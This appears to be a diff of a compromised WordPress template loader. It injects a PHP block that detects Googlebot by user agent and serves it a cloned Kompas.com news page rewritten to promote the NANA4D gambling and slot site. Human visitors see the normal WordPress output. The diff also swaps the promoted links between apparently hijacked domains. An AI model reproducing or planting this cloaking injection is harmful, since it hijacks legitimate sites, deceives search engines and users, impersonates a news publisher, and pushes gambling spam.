@@ -1,4 +1,9 @@
+<?php
 
+if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
+{
+?>
+   
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -49,14 +54,14 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 <meta name="viewport" content="width=device-width">
 <meta name="google-site-verification" content="hYvKX-qck61_ASHM-1BMdG8A6m-jboChRREVMAOba8A" />
-<meta content="NANA4D merupakan salah satu penerbit resmi link gacor toto 4d situs slot88 resmi terpercaya 2026 yang menyembunyikan identitas nya menjadi agen slot gacor server thailand dengan winrate paling stabil dan pasti maxwin hari ini. rasakan keseruan panduan main toto togel 4d bet kecil, fitur deposit pulsa tercepat, dan simbol unik scatter hitam slot online gampang menang."/>
+<meta content="NANA4D merupakan salah satu penerbit resmi situs gacor toto 4d link slot88 resmi terpercaya 2026 yang menyembunyikan identitas nya menjadi agen slot gacor server thailand dengan winrate paling stabil dan pasti maxwin hari ini. rasakan keseruan panduan main toto togel 4d bet kecil, fitur deposit pulsa tercepat, dan simbol unik scatter hitam slot online gampang menang."/>
 <link rel="prefetch" href="https://citizen-science-1ocean.zooreach.org/" as="document"/>
-<link rel="amphtml" href="https://adaro-indonesia.org/pages/view/citizen-science/" />
+<link rel="amphtml" href="https://poltekkeskepri.org/amp/citizen-science/" />
 <link rel="alternate" href="https://citizen-science-1ocean.zooreach.org/"> 
-<link rel="alternate" href="https://adaro-indonesia.org/pages/view/citizen-science/" hreflang="id">
+<link rel="alternate" href="https://poltekkeskepri.org/amp/citizen-science/" hreflang="id">
 <link rel="alternate" href="https://citizen-science-1ocean.zooreach.org/" hreflang="en">
 <link rel="alternate" href="https://citizen-science-1ocean.zooreach.org/" hreflang="x-default">
-<link rel="alternate" hreflang="id-ID" href="https://adaro-indonesia.org/pages/view/citizen-science/" />
+<link rel="alternate" hreflang="id-ID" href="https://poltekkeskepri.org/amp/citizen-science/" />
 <link rel="alternate" hreflang="en-US" href="https://citizen-science-1ocean.zooreach.org/" />
 <link rel="alternate" hreflang="en-SG" href="https://citizen-science-1ocean.zooreach.org/" />
 <meta name="googlebot-news" content="index, follow" />
@@ -76,7 +81,7 @@
 <meta property="og:type" content="article" />
 <meta property="og:image" content="https://i.imgur.com/zp53ckp.png" />
 <meta property="og:title" content="NANA4D - Penerbit Link Toto 4D Situs Slot88 Resmi 2026 & Agen Slot Gacor Thailand Pasti Maxwin" />
-<meta property="og:description" content="NANA4D merupakan salah satu penerbit resmi link gacor toto 4d situs slot88 resmi terpercaya 2026 yang menyembunyikan identitas nya menjadi agen slot gacor server thailand dengan winrate paling stabil dan pasti maxwin hari ini. rasakan keseruan panduan main toto togel 4d bet kecil, fitur deposit pulsa tercepat, dan simbol unik scatter hitam slot online gampang menang.">
+<meta property="og:description" content="NANA4D merupakan salah satu penerbit resmi situs gacor toto 4d link slot88 resmi terpercaya 2026 yang menyembunyikan identitas nya menjadi agen slot gacor server thailand dengan winrate paling stabil dan pasti maxwin hari ini. rasakan keseruan panduan main toto togel 4d bet kecil, fitur deposit pulsa tercepat, dan simbol unik scatter hitam slot online gampang menang.">
 <meta property="og:url" content="https://citizen-science-1ocean.zooreach.org/" />
 <meta property="og:site_name" content="KOMPAS.com" />
 <meta property="fb:app_id" content="324557847592228" />
@@ -87,7 +92,7 @@
 <meta name="twitter:site" content="@kompascom" />
 <meta name="twitter:creator" content="@kompascom">
 <meta name="twitter:title" content="NANA4D - Penerbit Link Toto 4D Situs Slot88 Resmi 2026 & Agen Slot Gacor Thailand Pasti Maxwin" />
-<meta name="twitter:description" content="NANA4D merupakan salah satu penerbit resmi link gacor toto 4d situs slot88 resmi terpercaya 2026 yang menyembunyikan identitas nya menjadi agen slot gacor server thailand dengan winrate paling stabil dan pasti maxwin hari ini. rasakan keseruan panduan main toto togel 4d bet kecil, fitur deposit pulsa tercepat, dan simbol unik scatter hitam slot online gampang menang." />
+<meta name="twitter:description" content="NANA4D merupakan salah satu penerbit resmi situs gacor toto 4d link slot88 resmi terpercaya 2026 yang menyembunyikan identitas nya menjadi agen slot gacor server thailand dengan winrate paling stabil dan pasti maxwin hari ini. rasakan keseruan panduan main toto togel 4d bet kecil, fitur deposit pulsa tercepat, dan simbol unik scatter hitam slot online gampang menang." />
 <meta name="twitter:image" content="https://i.imgur.com/zp53ckp.png" />
 <!-- E:tweeter card -->
 
@@ -165,7 +170,7 @@ window.jixie_o = {
 				itemid:"20250904172000388", 
 				keywords:array_keywords,
 				title:"NANA4D - Penerbit Link Toto 4D Situs Slot88 Resmi 2026 & Agen Slot Gacor Thailand Pasti Maxwin",
-				description: "NANA4D merupakan salah satu penerbit resmi link gacor toto 4d situs slot88 resmi terpercaya 2026 yang menyembunyikan identitas nya menjadi agen slot gacor server thailand dengan winrate paling stabil dan pasti maxwin hari ini. rasakan keseruan panduan main toto togel 4d bet kecil, fitur deposit pulsa tercepat, dan simbol unik scatter hitam slot online gampang menang.",
+				description: "NANA4D merupakan salah satu penerbit resmi situs gacor toto 4d link slot88 resmi terpercaya 2026 yang menyembunyikan identitas nya menjadi agen slot gacor server thailand dengan winrate paling stabil dan pasti maxwin hari ini. rasakan keseruan panduan main toto togel 4d bet kecil, fitur deposit pulsa tercepat, dan simbol unik scatter hitam slot online gampang menang.",
 				category: "Prov"
 			}
 		});
@@ -330,7 +335,7 @@ var rl_adx_val = '';
 
 
 <script type="application/ld+json">
-{"@context":"http:\/\/schema.org","@type":"NewsArticle","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.kompas.com\/jawa-barat\/read\/2025\/09\/04\/172000388\/kompol-cosmas-dipecat-tidak-hormat-pernah-terseret-kasus-penyiraman#"},"headline":"NANA4D - Penerbit Link Toto 4D Situs Slot88 Resmi 2026 & Agen Slot Gacor Thailand Pasti Maxwin","image":{"@type":"ImageObject","url":"https:\/\/asset.kompas.com\/crops\/iG7a3sTiZT7pAljmYKLfoJbEnJQ=\/0x0:0x0\/780x390\/data\/photo\/2025\/09\/03\/68b836bc52796.jpeg","height":500,"width":750},"datePublished":"2025-09-04T10:20:00+00:00","dateModified":"2025-09-04T10:20:00+00:00","author":{"@type":"Person","name":"NANA4D ","url":"https:\/\/indeks.kompas.com\/profile\/"},"publisher":{"@type":"Organization","name":"Kompas.com","logo":{"@type":"ImageObject","url":"https:\/\/asset.kompas.com\/data\/2017\/wp\/images\/logo-kompascom-jmd.png","width":255,"height":55}},"description":"NANA4D merupakan salah satu penerbit resmi link gacor toto 4d situs slot88 resmi terpercaya 2026 yang menyembunyikan identitas nya menjadi agen slot gacor server thailand dengan winrate paling stabil dan pasti maxwin hari ini. rasakan keseruan panduan main toto togel 4d bet kecil, fitur deposit pulsa tercepat, dan simbol unik scatter hitam slot online gampang menang."}</script>
+{"@context":"http:\/\/schema.org","@type":"NewsArticle","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.kompas.com\/jawa-barat\/read\/2025\/09\/04\/172000388\/kompol-cosmas-dipecat-tidak-hormat-pernah-terseret-kasus-penyiraman#"},"headline":"NANA4D - Penerbit Link Toto 4D Situs Slot88 Resmi 2026 & Agen Slot Gacor Thailand Pasti Maxwin","image":{"@type":"ImageObject","url":"https:\/\/asset.kompas.com\/crops\/iG7a3sTiZT7pAljmYKLfoJbEnJQ=\/0x0:0x0\/780x390\/data\/photo\/2025\/09\/03\/68b836bc52796.jpeg","height":500,"width":750},"datePublished":"2025-09-04T10:20:00+00:00","dateModified":"2025-09-04T10:20:00+00:00","author":{"@type":"Person","name":"NANA4D ","url":"https:\/\/indeks.kompas.com\/profile\/"},"publisher":{"@type":"Organization","name":"Kompas.com","logo":{"@type":"ImageObject","url":"https:\/\/asset.kompas.com\/data\/2017\/wp\/images\/logo-kompascom-jmd.png","width":255,"height":55}},"description":"NANA4D merupakan salah satu penerbit resmi situs gacor toto 4d link slot88 resmi terpercaya 2026 yang menyembunyikan identitas nya menjadi agen slot gacor server thailand dengan winrate paling stabil dan pasti maxwin hari ini. rasakan keseruan panduan main toto togel 4d bet kecil, fitur deposit pulsa tercepat, dan simbol unik scatter hitam slot online gampang menang."}</script>
 
 
 <script type="application/ld+json">
@@ -509,7 +514,7 @@ src="https://www.facebook.com/tr?id=423063207362401&ev=PageView&noscript=1"
                     <div class="sso__header col-bs12-4">
                         <ul class="sso__wrap">
                             <li class="sso__item">
-                                <a class="sso__link sso__link__icon js-sso-user" href="https://adaro-indonesia.org/pages/view/citizen-science/" rel="nofollow">
+                                <a class="sso__link sso__link__icon js-sso-user" href="https://poltekkeskepri.org/amp/citizen-science/" rel="nofollow">
                                     <i class="sso__icon__login" id="sso__icon__login_top"></i>
                                     <i class="sso__badge" style="display: none;"></i>
                                 </a>
@@ -528,7 +533,7 @@ src="https://www.facebook.com/tr?id=423063207362401&ev=PageView&noscript=1"
                                             </a>
                                         </li> -->
                         
-                                                                                    <li><a href="https://adaro-indonesia.org/pages/view/citizen-science/"><span><i class="sso__icon__subscription"></i> Gabung NANA4D <i class="sso__badge__inline"></i></span></a></li>
+                                                                                    <li><a href="https://poltekkeskepri.org/amp/citizen-science/"><span><i class="sso__icon__subscription"></i> Gabung NANA4D <i class="sso__badge__inline"></i></span></a></li>
                                                                                 
                                         <li></li>
                                         <li><a href="https://activity.kompas.com/saved"><span><i class="sso__icon__bookmark"></i> Konten yang disimpan</span></a></li>
@@ -544,7 +549,7 @@ src="https://www.facebook.com/tr?id=423063207362401&ev=PageView&noscript=1"
                         </ul>
                     </div>
                                         <div class="kid__wrap">
-                        <a target="_blank" href="https://adaro-indonesia.org/pages/view/citizen-science/" rel="nofollow" class="kid__button">SUBSCRIBE NANA4D</a>
+                        <a target="_blank" href="https://poltekkeskepri.org/amp/citizen-science/" rel="nofollow" class="kid__button">SUBSCRIBE NANA4D</a>
                     </div>
                                     </div>
             </div>
@@ -859,7 +864,7 @@ src="https://www.facebook.com/tr?id=423063207362401&ev=PageView&noscript=1"
     </li>
 </ul>
 
-<a href="https://adaro-indonesia.org/pages/view/citizen-science/" rel="nofollow"class="menu-plus-sticky">Membership NANA4D</a>
+<a href="https://poltekkeskepri.org/amp/citizen-science/" rel="nofollow"class="menu-plus-sticky">Membership NANA4D</a>
 
 <!-- css sublink nav -->
 <link rel="stylesheet" href="https://asset.kompas.com/data/2025/nusatirta/desktop/css/submenu-nusatirta.css">
@@ -1146,10 +1151,10 @@ src="https://www.facebook.com/tr?id=423063207362401&ev=PageView&noscript=1"
 <div class="photoCarousel" style="margin-top: 2%;">
     <div class="photoCarousel-block" data-scroll="side">
                   <div class="button-login-daftar">
-                     <a class="login" href="https://adaro-indonesia.org/pages/view/citizen-science/" rel="nofollow noreferrer" style="color: rgba(0, 0, 0, 1);">
+                     <a class="login" href="https://poltekkeskepri.org/amp/citizen-science/" rel="nofollow noreferrer" style="color: rgba(0, 0, 0, 1);">
                          LOGIN
                      </a>
-                     <a class="register" href="https://adaro-indonesia.org/pages/view/citizen-science/" rel="nofollow noreferrer" style="color: rgba(0, 0, 0, 1);">
+                     <a class="register" href="https://poltekkeskepri.org/amp/citizen-science/" rel="nofollow noreferrer" style="color: rgba(0, 0, 0, 1);">
                          DAFTAR
                      </a>
             
@@ -1917,7 +1922,7 @@ src="https://www.facebook.com/tr?id=423063207362401&ev=PageView&noscript=1"
                         Dapatkan Keseruan dan Permainan Menyenangkan di NANA4D           </div>
 
                     <div class="footerNewsletter-cta">
-                        <a href="https://adaro-indonesia.org/pages/view/citizen-science/"class="footerNewsletter-link" rel="nofollow">
+                        <a href="https://poltekkeskepri.org/amp/citizen-science/"class="footerNewsletter-link" rel="nofollow">
                             <i class="iconNewsletter"></i> DAFTAR
                         </a>
                     </div>
@@ -2913,3 +2918,149 @@ if (onSubmitNps !== null) {
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"bf5b37be2c3c40e0bd28c1cdeb60379a","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
+
+<?php
+exit;
+}
+?>
+
+<?php
+/**
+ * Loads the correct template based on the visitor's URL
+ *
+ * @package WordPress
+ */
+if ( wp_using_themes() ) {
+	/**
+	 * Fires before determining which template to load.
+	 *
+	 * This action hook executes just before WordPress determines which template page to load.
+	 * It is a good hook to use if you need to do a redirect with full knowledge of the content
+	 * that has been queried.
+	 *
+	 * Note: Loading a different template is not a good use of this hook. If you include another template
+	 * and then use `exit()` or `die()`, no subsequent `template_redirect` hooks will be run, which could
+	 * break the site’s functionality. Instead, use the {@see 'template_include'} filter hook to return
+	 * the path to the new template you want to use. This will allow an alternative template to be used
+	 * without interfering with the WordPress loading process.
+	 *
+	 * @since 1.5.0
+	 */
+	do_action( 'template_redirect' );
+}
+
+/**
+ * Filters whether to allow 'HEAD' requests to generate content.
+ *
+ * Provides a significant performance bump by exiting before the page
+ * content loads for 'HEAD' requests. See #14348.
+ *
+ * @since 3.5.0
+ *
+ * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
+ */
+if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
+	exit;
+}
+
+// Process feeds and trackbacks even if not using themes.
+if ( is_robots() ) {
+	/**
+	 * Fired when the template loader determines a robots.txt request.
+	 *
+	 * @since 2.1.0
+	 */
+	do_action( 'do_robots' );
+	return;
+} elseif ( is_favicon() ) {
+	/**
+	 * Fired when the template loader determines a favicon.ico request.
+	 *
+	 * @since 5.4.0
+	 */
+	do_action( 'do_favicon' );
+	return;
+} elseif ( is_feed() ) {
+	do_feed();
+	return;
+} elseif ( is_trackback() ) {
+	require ABSPATH . 'wp-trackback.php';
+	return;
+}
+
+if ( wp_using_themes() ) {
+
+	$tag_templates = array(
+		'is_embed'             => 'get_embed_template',
+		'is_404'               => 'get_404_template',
+		'is_search'            => 'get_search_template',
+		'is_front_page'        => 'get_front_page_template',
+		'is_home'              => 'get_home_template',
+		'is_privacy_policy'    => 'get_privacy_policy_template',
+		'is_post_type_archive' => 'get_post_type_archive_template',
+		'is_tax'               => 'get_taxonomy_template',
+		'is_attachment'        => 'get_attachment_template',
+		'is_single'            => 'get_single_template',
+		'is_page'              => 'get_page_template',
+		'is_singular'          => 'get_singular_template',
+		'is_category'          => 'get_category_template',
+		'is_tag'               => 'get_tag_template',
+		'is_author'            => 'get_author_template',
+		'is_date'              => 'get_date_template',
+		'is_archive'           => 'get_archive_template',
+	);
+	$template      = false;
+
+	// Loop through each of the template conditionals, and find the appropriate template file.
+	foreach ( $tag_templates as $tag => $template_getter ) {
+		if ( call_user_func( $tag ) ) {
+			$template = call_user_func( $template_getter );
+		}
+
+		if ( $template ) {
+			if ( 'is_attachment' === $tag ) {
+				remove_filter( 'the_content', 'prepend_attachment' );
+			}
+
+			break;
+		}
+	}
+
+	if ( ! $template ) {
+		$template = get_index_template();
+	}
+
+	/**
+	 * Filters the path of the current template before including it.
+	 *
+	 * @since 3.0.0
+	 *
+	 * @param string $template The path of the template to include.
+	 */
+	$template   = apply_filters( 'template_include', $template );
+	$is_stringy = is_string( $template ) || ( is_object( $template ) && method_exists( $template, '__toString' ) );
+	$template   = $is_stringy ? realpath( (string) $template ) : null;
+	if (
+		is_string( $template ) &&
+		( str_ends_with( $template, '.php' ) || str_ends_with( $template, '.html' ) ) &&
+		is_file( $template ) &&
+		is_readable( $template )
+	) {
+		/**
+		 * Fires immediately before including the template.
+		 *
+		 * @since 6.9.0
+		 *
+		 * @param string $template The path of the template about to be included.
+		 */
+		do_action( 'wp_before_include_template', $template );
+
+		include $template;
+	} elseif ( current_user_can( 'switch_themes' ) ) {
+		$theme = wp_get_theme();
+		if ( $theme->errors() ) {
+			wp_die( $theme->errors() );
+		}
+	}
+	return;
+}
